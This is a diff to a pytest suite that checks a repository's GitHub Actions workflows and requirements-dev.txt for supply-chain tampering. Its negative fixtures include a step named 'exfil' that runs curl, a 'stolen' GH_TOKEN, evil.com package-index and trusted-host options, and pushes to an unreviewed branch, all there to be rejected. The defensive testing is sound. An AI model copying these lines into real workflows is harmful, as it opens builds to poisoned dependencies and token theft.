@@ -1209,22 +1209,13 @@ def _validate_release_publish_step_4(s4: Any) -> None:
     assert s4.get("env") == {"GH_TOKEN": "${{ github.token }}"}, "release job step 4 env must be exactly GH_TOKEN"
 
 
-def _validate_release_publish_step_install(s_inst: Any) -> None:
-    expected_cmd = "python -m pip install -r requirements-dev.txt"
-    assert isinstance(s_inst, dict), "release job step 2 must be mapping"
-    assert s_inst.get("name") == "Install dependencies", "release job step 2 must be Install dependencies"
-    assert str(s_inst.get("run", "")).strip() == expected_cmd, "release job step 2 must run canonical install"
-    assert "env" not in s_inst, "release job step 2 must not declare env"
-
-
 def _validate_release_publish_steps(steps: list[Any]) -> None:
-    assert len(steps) == 6, f"expected 6 release steps, got {len(steps)}"
+    assert len(steps) == 5, f"expected 5 release steps, got {len(steps)}"
     _validate_release_publish_step_0(steps[0])
     _validate_release_publish_step_1(steps[1])
-    _validate_release_publish_step_install(steps[2])
-    _validate_release_publish_step_2(steps[3])
-    _validate_release_publish_step_3(steps[4])
-    _validate_release_publish_step_4(steps[5])
+    _validate_release_publish_step_2(steps[2])
+    _validate_release_publish_step_3(steps[3])
+    _validate_release_publish_step_4(steps[4])
 
 
 def _validate_release_job(release: dict[str, Any]) -> None:
@@ -2399,7 +2390,7 @@ class TestReleaseWorkflowNegativeMutants:
 
         doc = yaml.safe_load(RELEASE_WORKFLOW.read_text(encoding="utf-8"))
         doc["jobs"]["release"]["steps"].append({"name": "exfil", "run": "curl https://example.com"})
-        with pytest.raises(AssertionError, match="expected 6 release steps"):
+        with pytest.raises(AssertionError, match="expected 5 release steps"):
             validate_release_workflow(doc)
         assert any("canonical steps" in e for e in cli_validate(doc))
 
@@ -2407,7 +2398,7 @@ class TestReleaseWorkflowNegativeMutants:
         from tools.validate_marketplace import validate_release_workflow as cli_validate
 
         doc = yaml.safe_load(RELEASE_WORKFLOW.read_text(encoding="utf-8"))
-        doc["jobs"]["release"]["steps"][5]["run"] = "gh release create evil"
+        doc["jobs"]["release"]["steps"][4]["run"] = "gh release create evil"
         with pytest.raises(AssertionError, match="canonical gh release create"):
             validate_release_workflow(doc)
         assert any("canonical gh release create" in e for e in cli_validate(doc))
@@ -2468,7 +2459,7 @@ class TestReleaseWorkflowNegativeMutants:
         assert any("services" in e for e in cli_validate(doc_sv))
 
         doc_env = yaml.safe_load(RELEASE_WORKFLOW.read_text(encoding="utf-8"))
-        doc_env["jobs"]["release"]["steps"][3]["env"] = {"GH_TOKEN": "stolen"}
+        doc_env["jobs"]["release"]["steps"][2]["env"] = {"GH_TOKEN": "stolen"}
         with pytest.raises(AssertionError, match="must not declare env"):
             validate_release_workflow(doc_env)
         assert any("must not declare env" in e for e in cli_validate(doc_env))
@@ -2477,13 +2468,13 @@ class TestReleaseWorkflowNegativeMutants:
         from tools.validate_marketplace import validate_release_workflow as cli_validate
 
         doc_plan = yaml.safe_load(RELEASE_WORKFLOW.read_text(encoding="utf-8"))
-        doc_plan["jobs"]["release"]["steps"][3]["run"] += "\ngit push origin HEAD:refs/heads/unreviewed"
+        doc_plan["jobs"]["release"]["steps"][2]["run"] += "\ngit push origin HEAD:refs/heads/unreviewed"
         with pytest.raises(AssertionError, match="exact semantic_release.py"):
             validate_release_workflow(doc_plan)
         assert any("exact canonical semantic_release.py" in e for e in cli_validate(doc_plan))
 
         doc_tag = yaml.safe_load(RELEASE_WORKFLOW.read_text(encoding="utf-8"))
-        doc_tag["jobs"]["release"]["steps"][4]["run"] += "\ngit push origin HEAD:refs/heads/unreviewed"
+        doc_tag["jobs"]["release"]["steps"][3]["run"] += "\ngit push origin HEAD:refs/heads/unreviewed"
         with pytest.raises(AssertionError, match="exact canonical tag commands"):
             validate_release_workflow(doc_tag)
         assert any("exact canonical git tag and push" in e for e in cli_validate(doc_tag))
@@ -2826,7 +2817,7 @@ def test_r28_fixture_fails_rule_b_and_current_workflows_pass() -> None:
 
 
 def test_depth1_clone_execution(tmp_path: Path) -> None:
-    depth1_dir = tmp_path / "ts-r35-depth1"
+    depth1_dir = tmp_path / "ts-r36-depth1"
     clone_proc = subprocess.run(
         ["git", "clone", "--depth", "1", f"file://{REPO_ROOT}", str(depth1_dir)],
         capture_output=True,
@@ -2834,13 +2825,9 @@ def test_depth1_clone_execution(tmp_path: Path) -> None:
         check=False,
     )
     assert clone_proc.returncode == 0, f"Depth-1 clone failed: {clone_proc.stderr}"
-    for rel_name in ("requirements-dev.txt", "tools/validate_skills.py", ".github/workflows/quality.yaml"):
-        src = REPO_ROOT / rel_name
-        dst = depth1_dir / rel_name
-        if src.is_file() and not dst.is_file():
-            dst.parent.mkdir(parents=True, exist_ok=True)
-            dst.write_bytes(src.read_bytes())
-    assert (depth1_dir / "requirements-dev.txt").is_file()
+    assert (depth1_dir / "requirements-dev.txt").is_file(), "requirements-dev.txt missing"
+    assert (depth1_dir / "tools" / "validate_skills.py").is_file(), "validate_skills.py missing"
+    assert (depth1_dir / ".github" / "workflows" / "quality.yaml").is_file(), "quality.yaml missing"
 
     clean_env = {k: v for k, v in os.environ.items() if not k.startswith("COV") and k != "COVERAGE_PROCESS_START"}
     run_proc = subprocess.run(
@@ -2876,3 +2863,425 @@ def test_legacy_step_import_analyser_deleted() -> None:
     )
     for name in deleted_names:
         assert not hasattr(validate_skills, name), f"{name} should be deleted per adopt-and-delete"
+
+
+# ==============================================================================
+# R36 Bounded Fixes Tests
+# ==============================================================================
+
+
+class TestR36RuleBWorkflowAndJobCoverage:
+    """SOL-R35-01 = TS35-01 = SOL-R35-03 = ARGON-003: Rule B coverage & unconditional install."""
+
+    def test_push_only_workflow_without_install_fails(self) -> None:
+        from tools.validate_skills import validate_workflow_install_steps
+
+        doc = {
+            "on": {"push": {"branches": ["main"]}},
+            "jobs": {
+                "push_job": {
+                    "runs-on": "ubuntu-latest",
+                    "steps": [
+                        {"uses": "actions/checkout@v7.0.0"},
+                        {"run": "echo hello"},
+                    ],
+                }
+            },
+        }
+        errors = validate_workflow_install_steps(doc, workflow_rel=".github/workflows/push.yaml")
+        expected_msg = "first run step must be exactly 'python -m pip install -r requirements-dev.txt'"
+        assert any(expected_msg in e for e in errors)
+
+    def test_extra_job_in_workflow_without_install_fails(self) -> None:
+        from tools.validate_skills import validate_workflow_install_steps
+
+        doc = yaml.safe_load(WORKFLOW.read_text(encoding="utf-8"))
+        doc["jobs"]["extra_job"] = {
+            "runs-on": "ubuntu-latest",
+            "steps": [
+                {"uses": "actions/checkout@v7.0.0"},
+                {"run": "python -m ruff check ."},
+            ],
+        }
+        errors = validate_workflow_install_steps(doc, workflow_rel=".github/workflows/quality.yaml")
+        assert any("job 'extra_job' first run step must be exactly" in e for e in errors)
+
+    def test_install_step_with_if_condition_fails(self) -> None:
+        from tools.validate_skills import validate_workflow_install_steps
+
+        doc = {
+            "jobs": {
+                "my_job": {
+                    "steps": [
+                        {
+                            "name": "Install",
+                            "if": "${{ github.actor != 'dependabot[bot]' }}",
+                            "run": "python -m pip install -r requirements-dev.txt",
+                        },
+                        {"run": "python -m ruff check ."},
+                    ]
+                }
+            }
+        }
+        errors = validate_workflow_install_steps(doc, workflow_rel=".github/workflows/custom.yaml")
+        assert any("canonical install step must not have an 'if:' condition" in e for e in errors)
+
+    def test_install_step_with_working_directory_fails(self) -> None:
+        from tools.validate_skills import validate_workflow_install_steps
+
+        doc = {
+            "jobs": {
+                "my_job": {
+                    "steps": [
+                        {
+                            "name": "Install",
+                            "working-directory": "tools",
+                            "run": "python -m pip install -r requirements-dev.txt",
+                        },
+                        {"run": "python -m ruff check ."},
+                    ]
+                }
+            }
+        }
+        errors = validate_workflow_install_steps(doc, workflow_rel=".github/workflows/custom.yaml")
+        assert any("canonical install step must not have 'working-directory'" in e for e in errors)
+
+    def test_install_step_with_shell_fails(self) -> None:
+        from tools.validate_skills import validate_workflow_install_steps
+
+        doc = {
+            "jobs": {
+                "my_job": {
+                    "steps": [
+                        {
+                            "name": "Install",
+                            "shell": "sh",
+                            "run": "python -m pip install -r requirements-dev.txt",
+                        },
+                        {"run": "python -m ruff check ."},
+                    ]
+                }
+            }
+        }
+        errors = validate_workflow_install_steps(doc, workflow_rel=".github/workflows/custom.yaml")
+        assert any("canonical install step must not have 'shell'" in e for e in errors)
+
+    def test_install_step_with_continue_on_error_fails(self) -> None:
+        from tools.validate_skills import validate_workflow_install_steps
+
+        doc = {
+            "jobs": {
+                "my_job": {
+                    "steps": [
+                        {
+                            "name": "Install",
+                            "continue-on-error": True,
+                            "run": "python -m pip install -r requirements-dev.txt",
+                        },
+                        {"run": "python -m ruff check ."},
+                    ]
+                }
+            }
+        }
+        errors = validate_workflow_install_steps(doc, workflow_rel=".github/workflows/custom.yaml")
+        assert any("canonical install step must not have 'continue-on-error'" in e for e in errors)
+
+    def test_install_step_with_env_fails(self) -> None:
+        from tools.validate_skills import validate_workflow_install_steps
+
+        doc = {
+            "jobs": {
+                "my_job": {
+                    "steps": [
+                        {
+                            "name": "Install",
+                            "env": {"PIP_INDEX_URL": "https://evil.com"},
+                            "run": "python -m pip install -r requirements-dev.txt",
+                        },
+                        {"run": "python -m ruff check ."},
+                    ]
+                }
+            }
+        }
+        errors = validate_workflow_install_steps(doc, workflow_rel=".github/workflows/custom.yaml")
+        assert any("canonical install step must not declare 'env'" in e for e in errors)
+
+    def test_setup_python_after_install_step_fails(self) -> None:
+        from tools.validate_skills import validate_workflow_install_steps
+
+        doc = {
+            "jobs": {
+                "my_job": {
+                    "steps": [
+                        {"run": "python -m pip install -r requirements-dev.txt"},
+                        {"uses": "actions/setup-python@v6.3.0", "with": {"python-version": "3.11"}},
+                        {"run": "python -m ruff check ."},
+                    ]
+                }
+            }
+        }
+        errors = validate_workflow_install_steps(doc, workflow_rel=".github/workflows/custom.yaml")
+        assert any("setup-python must appear before canonical install step" in e for e in errors)
+
+    def test_checkout_after_install_step_fails(self) -> None:
+        from tools.validate_skills import validate_workflow_install_steps
+
+        doc = {
+            "jobs": {
+                "my_job": {
+                    "steps": [
+                        {"run": "python -m pip install -r requirements-dev.txt"},
+                        {"uses": "actions/checkout@v7.0.0"},
+                        {"run": "python -m ruff check ."},
+                    ]
+                }
+            }
+        }
+        errors = validate_workflow_install_steps(doc, workflow_rel=".github/workflows/custom.yaml")
+        assert any("checkout must appear before canonical install step" in e for e in errors)
+
+
+class TestR36InstallerFormRejection:
+    """SOL-R35-04: Reject every other installer form anywhere in workflows."""
+
+    @pytest.mark.parametrize(
+        "installer_cmd",
+        [
+            "pip install requests",
+            "pip3 install requests",
+            "pipx install requests",
+            "uv pip install requests",
+            "uv add requests",
+            "easy_install requests",
+            "python -m pip install requests",
+            "python3 -m pip install requests",
+            "python -Im pip install requests",
+            "python -m pip3 install requests",
+            "python3 -m pip3 install requests",
+            "echo ok; pip install requests",
+            "true && pip3 install requests",
+            "false || uv pip install requests",
+            "python -m pip install -r requirements.txt",
+        ],
+    )
+    def test_installer_form_detected_and_rejected(self, installer_cmd: str) -> None:
+        from tools.validate_skills import _cmd_contains_installer, validate_workflow_install_steps
+
+        assert _cmd_contains_installer(installer_cmd) is True
+
+        doc = {
+            "jobs": {
+                "my_job": {
+                    "steps": [
+                        {"run": "python -m pip install -r requirements-dev.txt"},
+                        {"name": "Secondary", "run": installer_cmd},
+                    ]
+                }
+            }
+        }
+        errors = validate_workflow_install_steps(doc, workflow_rel=".github/workflows/custom.yaml")
+        assert any("disallowed secondary pip install" in e for e in errors)
+
+
+class TestR36RequirementsDevExactness:
+    """TS35-03 = ARGON-002: requirements-dev.txt exact pin and option rejection."""
+
+    def test_canonical_requirements_dev_passes(self) -> None:
+        from tools.validate_skills import validate_requirements_dev_content
+
+        canonical = "# Development dependencies\npytest==8.3.4\npytest-cov==6.0.0\npyyaml==6.0.1\nruff==0.15.21\n"
+        assert validate_requirements_dev_content(canonical) == []
+
+    def test_drifted_pin_fails(self) -> None:
+        from tools.validate_skills import validate_requirements_dev_content
+
+        drifted = "pytest==8.3.41\npytest-cov==6.0.0\npyyaml==6.0.1\nruff==0.15.21\n"
+        errors = validate_requirements_dev_content(drifted)
+        assert any("unexpected or drifted requirement: 'pytest==8.3.41'" in e for e in errors)
+
+    def test_unpinned_line_fails(self) -> None:
+        from tools.validate_skills import validate_requirements_dev_content
+
+        unpinned = "pytest\npytest-cov==6.0.0\npyyaml==6.0.1\nruff==0.15.21\n"
+        errors = validate_requirements_dev_content(unpinned)
+        assert any("requirement must use exact '==' pin: 'pytest'" in e for e in errors)
+
+    def test_non_exact_operator_fails(self) -> None:
+        from tools.validate_skills import validate_requirements_dev_content
+
+        gte = "pytest>=8.3.4\npytest-cov==6.0.0\npyyaml==6.0.1\nruff==0.15.21\n"
+        errors = validate_requirements_dev_content(gte)
+        assert any("requirement must use exact '==' pin" in e for e in errors)
+
+    @pytest.mark.parametrize(
+        "option_line",
+        [
+            "--extra-index-url https://evil.com/simple",
+            "-i https://evil.com/simple",
+            "--index-url https://evil.com/simple",
+            "-f https://evil.com/wheels",
+            "-e .",
+            "-r other.txt",
+            "-c constraints.txt",
+            "--trusted-host evil.com",
+        ],
+    )
+    def test_option_or_flag_line_fails(self, option_line: str) -> None:
+        from tools.validate_skills import validate_requirements_dev_content
+
+        content = f"{option_line}\npytest==8.3.4\npytest-cov==6.0.0\npyyaml==6.0.1\nruff==0.15.21\n"
+        errors = validate_requirements_dev_content(content)
+        assert any("disallowed option or flag" in e for e in errors)
+
+    def test_missing_pin_fails(self) -> None:
+        from tools.validate_skills import validate_requirements_dev_content
+
+        missing = "pytest==8.3.4\npytest-cov==6.0.0\nruff==0.15.21\n"
+        errors = validate_requirements_dev_content(missing)
+        assert any("missing expected requirement: 'pyyaml==6.0.1'" in e for e in errors)
+
+
+class TestR36PrivilegedJobContract:
+    """TS35-04: Privileged jobs write permissions, no install, stdlib-only scripts."""
+
+    def test_current_release_workflow_passes_privileged_check(self) -> None:
+        from tools.validate_skills import validate_workflow_install_steps
+
+        curr_release_doc = yaml.safe_load(RELEASE_WORKFLOW.read_text(encoding="utf-8"))
+        errors = validate_workflow_install_steps(
+            curr_release_doc,
+            workflow_rel=".github/workflows/release.yaml",
+            repo_root=REPO_ROOT,
+        )
+        assert errors == [], f"Current release.yaml must pass Rule B: {errors}"
+
+    def test_privileged_job_with_install_fails(self) -> None:
+        from tools.validate_skills import validate_workflow_install_steps
+
+        doc = yaml.safe_load(RELEASE_WORKFLOW.read_text(encoding="utf-8"))
+        doc["jobs"]["release"]["steps"].insert(
+            2, {"name": "Install", "run": "python -m pip install -r requirements-dev.txt"}
+        )
+        errors = validate_workflow_install_steps(
+            doc,
+            workflow_rel=".github/workflows/release.yaml",
+            repo_root=REPO_ROOT,
+        )
+        expected_err = "privileged job 'release' in '.github/workflows/release.yaml' must not run any package installer"
+        assert any(expected_err in e for e in errors)
+
+    def test_privileged_job_with_pip_installer_fails(self) -> None:
+        from tools.validate_skills import validate_workflow_install_steps
+
+        doc = yaml.safe_load(RELEASE_WORKFLOW.read_text(encoding="utf-8"))
+        doc["jobs"]["release"]["steps"].append({"name": "Extra install", "run": "pip install requests"})
+        errors = validate_workflow_install_steps(
+            doc,
+            workflow_rel=".github/workflows/release.yaml",
+            repo_root=REPO_ROOT,
+        )
+        assert any("must not run any package installer" in e for e in errors)
+
+    def test_privileged_job_with_unapproved_script_fails(self) -> None:
+        from tools.validate_skills import validate_workflow_install_steps
+
+        doc = yaml.safe_load(RELEASE_WORKFLOW.read_text(encoding="utf-8"))
+        doc["jobs"]["release"]["steps"].append({"name": "Unapproved", "run": "python scripts/lint_skills.py"})
+        errors = validate_workflow_install_steps(
+            doc,
+            workflow_rel=".github/workflows/release.yaml",
+            repo_root=REPO_ROOT,
+        )
+        assert any("runs unapproved script 'scripts/lint_skills.py'" in e for e in errors)
+
+    def test_privileged_job_with_non_stdlib_import_fails(self, tmp_path: Path) -> None:
+        from tools.validate_skills import _check_script_top_level_stdlib_only
+
+        bad_script = tmp_path / "scripts" / "semantic_release.py"
+        bad_script.parent.mkdir(parents=True, exist_ok=True)
+        bad_script.write_text("import sys\nimport requests\n", encoding="utf-8")
+        errors = _check_script_top_level_stdlib_only("scripts/semantic_release.py", tmp_path)
+        assert any("has non-stdlib top-level import: 'requests'" in e for e in errors)
+
+    def test_privileged_job_with_local_import_fails(self, tmp_path: Path) -> None:
+        from tools.validate_skills import _check_script_top_level_stdlib_only
+
+        bad_script = tmp_path / "scripts" / "semantic_release.py"
+        bad_script.parent.mkdir(parents=True, exist_ok=True)
+        bad_script.write_text("import sys\nimport tools\n", encoding="utf-8")
+        errors = _check_script_top_level_stdlib_only("scripts/semantic_release.py", tmp_path)
+        assert any("has non-stdlib top-level import: 'tools'" in e for e in errors)
+
+    def test_non_allowlisted_job_with_write_permissions_fails(self) -> None:
+        from tools.validate_skills import validate_workflow_install_steps
+
+        doc = {
+            "jobs": {
+                "rogue_job": {
+                    "permissions": {"contents": "write"},
+                    "steps": [
+                        {"run": "python -m pip install -r requirements-dev.txt"},
+                        {"run": "echo pwned"},
+                    ],
+                }
+            }
+        }
+        errors = validate_workflow_install_steps(doc, workflow_rel=".github/workflows/custom.yaml")
+        assert any("has write permissions but is not in PRIVILEGED_JOB_ALLOWLIST" in e for e in errors)
+
+
+class TestR36RuleCFixturesExemption:
+    """SOL-R35-02 = TS35-02 = ARGON-001: Exemption is exactly tests/fixtures/ prefix."""
+
+    def test_tests_fixtures_prefix_is_exempt_from_tracking(self, tmp_path: Path) -> None:
+        from tools.validate_skills import get_tracked_python_files
+
+        fixtures_dir = tmp_path / "tests" / "fixtures" / "sub"
+        fixtures_dir.mkdir(parents=True, exist_ok=True)
+        (fixtures_dir / "sample.py").write_text("import requests\n", encoding="utf-8")
+        files = get_tracked_python_files(tmp_path)
+        assert not any("sample.py" in str(f) for f in files)
+
+    def test_other_fixtures_directory_is_scanned_and_fails(self, tmp_path: Path) -> None:
+        from tools.validate_skills import _validate_single_python_file, get_tracked_python_files
+
+        scripts_fixtures = tmp_path / "scripts" / "fixtures"
+        scripts_fixtures.mkdir(parents=True, exist_ok=True)
+        sample = scripts_fixtures / "helper.py"
+        sample.write_text("import requests\n", encoding="utf-8")
+
+        files = get_tracked_python_files(tmp_path)
+        assert sample in files, "scripts/fixtures/helper.py must not be exempted"
+
+        errors = _validate_single_python_file(sample, tmp_path, {"pytest", "pytest-cov", "pyyaml", "ruff"})
+        assert any("disallowed top-level import 'requests'" in e for e in errors)
+
+    def test_tools_fixtures_directory_is_scanned_and_fails(self, tmp_path: Path) -> None:
+        from tools.validate_skills import _validate_single_python_file, get_tracked_python_files
+
+        tools_fixtures = tmp_path / "tools" / "fixtures"
+        tools_fixtures.mkdir(parents=True, exist_ok=True)
+        sample = tools_fixtures / "helper.py"
+        sample.write_text("import requests\n", encoding="utf-8")
+
+        files = get_tracked_python_files(tmp_path)
+        assert sample in files, "tools/fixtures/helper.py must not be exempted"
+
+        errors = _validate_single_python_file(sample, tmp_path, {"pytest", "pytest-cov", "pyyaml", "ruff"})
+        assert any("disallowed top-level import 'requests'" in e for e in errors)
+
+    def test_yaml_maps_to_pyyaml_and_pyyaml_import_rejected(self, tmp_path: Path) -> None:
+        from tools.validate_skills import MODULE_TO_DIST, _validate_single_python_file
+
+        assert MODULE_TO_DIST.get("yaml") == "pyyaml"
+        assert "pyyaml" not in MODULE_TO_DIST
+
+        pinned_dists = {"pyyaml"}
+        py_yaml = tmp_path / "mod_yaml.py"
+        py_yaml.write_text("import yaml\n", encoding="utf-8")
+        assert _validate_single_python_file(py_yaml, tmp_path, pinned_dists) == []
+
+        py_pyyaml = tmp_path / "mod_pyyaml.py"
+        py_pyyaml.write_text("import pyyaml\n", encoding="utf-8")
+        errors = _validate_single_python_file(py_pyyaml, tmp_path, pinned_dists)
+        assert any("disallowed top-level import 'pyyaml'" in e for e in errors)
